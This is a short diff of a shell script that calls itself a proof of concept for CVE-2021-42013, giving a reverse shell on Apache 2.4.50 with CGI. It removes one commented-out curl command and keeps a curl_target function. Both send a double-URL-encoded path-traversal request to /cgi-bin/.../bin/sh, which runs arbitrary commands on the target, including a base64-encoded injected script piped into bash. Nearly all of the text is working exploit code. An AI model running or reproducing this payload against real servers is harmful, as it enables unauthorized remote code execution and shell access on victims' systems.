@@ -15,8 +15,6 @@ inject=$(cat $(dirname -- "$0")/templates/attack_visa.sh | base64)
 
 echo 'PoC CVE-2021-42013 reverse shell Apache 2.4.50 with CGI'
 
-#curl "$1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; echo '${inject}' | base64 -d | bash -"
-
 function curl_target(){
 curl -s "$1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; $2"
 }
